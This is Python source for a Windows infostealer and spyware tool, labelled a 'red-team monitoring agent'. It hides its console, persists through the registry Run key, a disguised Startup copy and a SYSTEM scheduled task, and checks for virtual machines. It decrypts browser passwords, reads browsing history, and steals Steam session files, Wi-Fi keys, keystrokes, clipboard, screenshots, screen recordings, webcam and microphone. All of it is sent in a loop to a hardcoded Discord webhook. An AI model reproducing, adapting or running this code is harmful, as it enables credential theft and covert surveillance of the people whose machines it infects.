# =====================================================
# ULTIMATE RED-TEAM MONITORING AGENT v4.6 - TXT EXFIL
# =====================================================
import os
import sys
import time
import socket
import platform
import threading
import subprocess
import getpass
import ctypes
import base64
import json
import random
import shutil
import tempfile
from datetime import datetime
import win32gui
import requests
import psutil
import pyperclip
import cv2
import numpy as np
import sounddevice as sd
import wave
from pynput.keyboard import Listener as KeyboardListener
import pyautogui
import sqlite3
import win32crypt
from Crypto.Cipher import AES

# ================== CONFIG ==================
CONFIG_FILE = "config.json"
DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/1504108072963014798/T6FC93tE6R8KYmeckjzuvsoTe_cdD6s8Acpo0IBgb6OqLvH54_1uBW9UKFdBPAZiAFx6"
INTERVAL = 25
SCREENSHOT_INTERVAL = 60
RECORD_DURATION = 20

LOG_FILE = os.path.join(os.getenv('APPDATA'), "WindowsUpdate.log")

def log(msg):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now()}] {msg}\n")
    except:
        pass

# ================== BROWSER PATHS ==================
BROWSER_PATHS = {
    "Chrome": os.path.join(os.getenv('LOCALAPPDATA'), r"Google\Chrome\User Data"),
    "Edge": os.path.join(os.getenv('LOCALAPPDATA'), r"Microsoft\Edge\User Data"),
    "Brave": os.path.join(os.getenv('LOCALAPPDATA'), r"BraveSoftware\Brave-Browser\User Data"),
    "Opera": os.path.join(os.getenv('APPDATA'), r"Opera Software\Opera Stable"),
    "OperaGX": os.path.join(os.getenv('APPDATA'), r"Opera Software\Opera GX Stable"),
    "Firefox": os.path.join(os.getenv('APPDATA'), r"Mozilla\Firefox\Profiles"),
    "Vivaldi": os.path.join(os.getenv('LOCALAPPDATA'), r"Vivaldi\User Data"),
    "TorBrowser": os.path.join(os.getenv('LOCALAPPDATA'), r"Tor Browser\Browser\TorBrowser\Data\Browser\Profiles"),
}

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE) as f:
                return json.load(f)
        except:
            pass
    return {"webhook": DEFAULT_WEBHOOK, "exfil_mode": "full", "encrypt": False}

config = load_config()
WEBHOOK_URL = config.get("webhook", DEFAULT_WEBHOOK)
ENCRYPT = config.get("encrypt", False)

def encrypt_data(data):
    key = b'labagent2025x'
    data = data.encode('utf-8')
    enc = bytearray()
    for i in range(len(data)):
        enc.append(data[i] ^ key[i % len(key)])
    return base64.b64encode(enc).decode('utf-8')

def stealth_mode():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        ctypes.windll.kernel32.SetConsoleTitleW("".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=15)))
    except:
        pass

def detect_vm():
    suspicious = ["vbox", "vmware", "sandbox", "debugger", "qemu", "virtual", "test"]
    hostname = socket.gethostname().lower()
    vm_score = sum(1 for x in suspicious if x in hostname)
    if psutil.cpu_percent(interval=1) < 15:
        vm_score += 2
    return vm_score >= 2, hostname

def add_persistence(script_path):
    try:
        import winreg as reg
        key = reg.HKEY_CURRENT_USER
        reg_key = reg.OpenKey(key, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(reg_key, "WindowsUpdateSvc", 0, reg.REG_SZ, f'pythonw "{script_path}"')
        reg.CloseKey(reg_key)

        startup = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup")
        shutil.copy(script_path, os.path.join(startup, "svchost.pyw"))

        subprocess.run(f'schtasks /create /tn "WindowsUpdate" /tr "pythonw {script_path}" /sc onlogon /ru SYSTEM /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log("Persistence added")
    except Exception as e:
        log(f"Persistence error: {e}")

# ================== DECRYPTION HELPERS ==================
def get_master_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            data = json.load(f)
        encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_password(encrypted, master_key):
    try:
        if len(encrypted) < 15:
            return "N/A"
        if encrypted[:5] == b'v10' and master_key:
            iv = encrypted[3:15]
            ciphertext = encrypted[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(ciphertext)[:-16].decode('utf-8', errors='ignore')
        else:
            return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except:
        return "DECRYPT_FAILED"

# ================== STEAM STEALER ==================
def steal_steam_data():
    steam_data = {"accounts": {}, "sessions": {}, "config": {}, "files": [], "ssfn": []}
    steam_path = os.path.join(os.getenv('PROGRAMFILES(x86)'), r"Steam") or os.path.join(os.getenv('PROGRAMFILES'), r"Steam")
    if not os.path.exists(steam_path):
        return steam_data
    for f in os.listdir(steam_path):
        if f.startswith("ssfn"):
            try:
                with open(os.path.join(steam_path, f), "rb") as sf:
                    steam_data["ssfn"].append({"name": f, "data": base64.b64encode(sf.read()).decode()})
            except:
                pass
    login_vdf = os.path.join(steam_path, "config", "loginusers.vdf")
    if os.path.exists(login_vdf):
        steam_data["accounts"] = open(login_vdf, "r", encoding="utf-8").read()[:8000]
    config_vdf = os.path.join(steam_path, "config", "config.vdf")
    if os.path.exists(config_vdf):
        steam_data["config"] = open(config_vdf, "r", encoding="utf-8").read()[:8000]
    for root, _, files in os.walk(os.path.join(steam_path, "config")):
        for file in files:
            if file.endswith(".vdf") or file.endswith(".bin"):
                steam_data["files"].append(file)
    return steam_data

# ================== TXT BROWSER EXFIL (PASSWORDS + HISTORY) ==================
def extract_browser_txt():
    txt_files = {}
    for browser, base_path in BROWSER_PATHS.items():
        if not os.path.exists(base_path):
            continue
        for profile in ["Default"] + [d for d in os.listdir(base_path) if d.startswith("Profile") or "default" in d][:3]:
            profile_path = os.path.join(base_path, profile) if browser != "Firefox" else os.path.join(base_path, profile)
            if not os.path.exists(profile_path):
                continue

            local_state = os.path.join(base_path, "Local State")
            master_key = get_master_key(local_state) if os.path.exists(local_state) else None

            # PASSWORDS → TXT
            login_db = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_db):
                try:
                    shutil.copy2(login_db, "temp_login.db")
                    conn = sqlite3.connect("temp_login.db")
                    cursor = conn.cursor()
                    content = f"=== {browser} {profile} - PASSWORDS ===\n\n"
                    for row in cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE password_value IS NOT NULL"):
                        url, user, enc = row
                        plain = decrypt_password(enc, master_key) if master_key else "ENCRYPTED"
                        content += f"URL     : {url}\nUSER    : {user}\nPASS    : {plain}\n{'-'*80}\n"
                    conn.close()
                    os.remove("temp_login.db")

                    fname = f"{browser}_{profile}_PASSWORDS.txt"
                    with open(fname, "w", encoding="utf-8") as f:
                        f.write(content)
                    with open(fname, "rb") as f:
                        txt_files[fname] = (fname, f.read(), "text/plain")
                    os.remove(fname)
                except:
                    pass

            # HISTORY → TXT
            history_db = os.path.join(profile_path, "History")
            if os.path.exists(history_db):
                try:
                    shutil.copy2(history_db, "temp_hist.db")
                    conn = sqlite3.connect("temp_hist.db")
                    cursor = conn.cursor()
                    content = f"=== {browser} {profile} - HISTORY (last 50) ===\n\n"
                    for row in cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 50"):
                        content += f"{row[0]} | {row[1]}\n"
                    conn.close()
                    os.remove("temp_hist.db")

                    fname = f"{browser}_{profile}_HISTORY.txt"
                    with open(fname, "w", encoding="utf-8") as f:
                        f.write(content)
                    with open(fname, "rb") as f:
                        txt_files[fname] = (fname, f.read(), "text/plain")
                    os.remove(fname)
                except:
                    pass

    return txt_files

# ================== OTHER MODULES ==================
def get_system_info(vm_detected=False):
    return {
        "timestamp": datetime.utcnow().isoformat(),
        "hostname": socket.gethostname(),
        "user": getpass.getuser(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "public_ip": requests.get("https://api.ipify.org", timeout=5).text if 'requests' in globals() else "N/A",
        "os": platform.platform(),
        "active_window": win32gui.GetWindowText(win32gui.GetForegroundWindow()),
        "processes": [p.info['name'] for p in psutil.process_iter(['name'])][:30],
        "vm_detected": vm_detected
    }

def get_clipboard():
    try:
        return pyperclip.paste()[:800]
    except:
        return "N/A"

def get_wifi_passwords():
    try:
        result = subprocess.check_output("netsh wlan show profile", shell=True).decode(errors="ignore")
        profiles = [line.split(":")[1].strip() for line in result.splitlines() if "All User Profile" in line]
        passwords = {}
        for profile in profiles:
            try:
                pw = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True).decode(errors="ignore")
                pw = [line.split(":")[1].strip() for line in pw.splitlines() if "Key Content" in line][0]
                passwords[profile] = pw
            except:
                pass
        return passwords
    except:
        return "N/A"

keylog_buffer = []
def on_press(key):
    global keylog_buffer
    try:
        keylog_buffer.append(str(key.char))
    except:
        keylog_buffer.append(f"[{key}]")
    if len(keylog_buffer) > 300:
        keylog_buffer = keylog_buffer[-300:]

def start_keylogger():
    try:
        listener = KeyboardListener(on_press=on_press)
        listener.daemon = True
        listener.start()
        log("Keylogger started")
    except:
        pass

def capture_webcam_and_mic():
    files = {}
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if ret:
            _, buffer = cv2.imencode('.jpg', frame)
            files["webcam.jpg"] = ("webcam.jpg", buffer.tobytes(), "image/jpeg")
    except:
        pass
    try:
        fs = 44100
        recording = sd.rec(int(10 * fs), samplerate=fs, channels=1, dtype='int16')
        sd.wait()
        with wave.open("mic.wav", "wb") as wf:
            wf.setnchannels(1)
            wf.setsampwidth(2)
            wf.setframerate(fs)
            wf.writeframes(recording.tobytes())
        files["mic.wav"] = ("mic.wav", open("mic.wav", "rb").read(), "audio/wav")
        os.remove("mic.wav")
    except:
        pass
    return files

def capture_screen_record():
    try:
        frames = []
        for _ in range(RECORD_DURATION):
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            frames.append(frame)
            time.sleep(1/15)
        height, width = frames[0].shape[:2]
        out = cv2.VideoWriter("screen.mp4", cv2.VideoWriter_fourcc(*'mp4v'), 15, (width, height))
        for f in frames:
            out.write(f)
        out.release()
        with open("screen.mp4", "rb") as f:
            data = f.read()
        os.remove("screen.mp4")
        return {"screen.mp4": ("screen.mp4", data, "video/mp4")}
    except:
        return {}

def send_to_webhook(payload, files=None):
    try:
        r = requests.post(WEBHOOK_URL, json=payload, files=files, timeout=20)
        log(f"Webhook status: {r.status_code if r else 'fail'}")
    except Exception as e:
        log(f"Webhook error: {e}")

# ================== MAIN LOOP ==================
def main_loop(script_path):
    log("=== AGENT v4.6 TXT EXFIL STARTED ===")
    add_persistence(script_path)
    stealth_mode()

    vm_detected, vm_name = detect_vm()
    if vm_detected:
        send_to_webhook({"embeds": [{"title": "🛡️ VM DETECTED", "description": vm_name, "color": 0xff0000}]})

    start_keylogger()

    ss_count = 0
    while True:
        try:
            info = get_system_info(vm_detected)
            info["clipboard"] = get_clipboard()
            info["wifi"] = get_wifi_passwords()
            info["steam"] = steal_steam_data()
            info["keylog"] = "".join(keylog_buffer[-300:]) or "N/A"
            info["browser"] = "See attached .txt files (decrypted passwords + history)"

            txt_attachments = extract_browser_txt()

            if ENCRYPT:
                encrypted = encrypt_data(json.dumps(info, default=str))
                payload = {"embeds": [{"title": "🛡️ AGENT v4.6 - ENCRYPTED", "description": encrypted[:1900], "color": 0x9900ff}]}
            else:
                payload = {"content": "**AGENT v4.6 REPORT - TXT FILES**```json\n" + json.dumps(info, default=str, indent=2)[:1900] + "\n```"}

            files = txt_attachments.copy()

            if ss_count % (SCREENSHOT_INTERVAL // INTERVAL) == 0:
                try:
                    shot = pyautogui.screenshot()
                    shot.save("screen.png")
                    files["screen.png"] = ("screen.png", open("screen.png","rb").read(), "image/png")
                    os.remove("screen.png")
                except:
                    pass

            if ss_count % 5 == 0:
                files.update(capture_webcam_and_mic())
                files.update(capture_screen_record())

            send_to_webhook(payload, files)
            ss_count += 1
            time.sleep(INTERVAL)
        except Exception as e:
            log(f"Loop error: {e}")
            time.sleep(INTERVAL)

# =============== START ===============
if __name__ == "__main__":
    stealth_mode()
    script_path = os.path.abspath(sys.argv[0])
    threading.Thread(target=main_loop, args=(script_path,), daemon=False).start()
    log("Main thread launched")
    while True:
        time.sleep(3600)
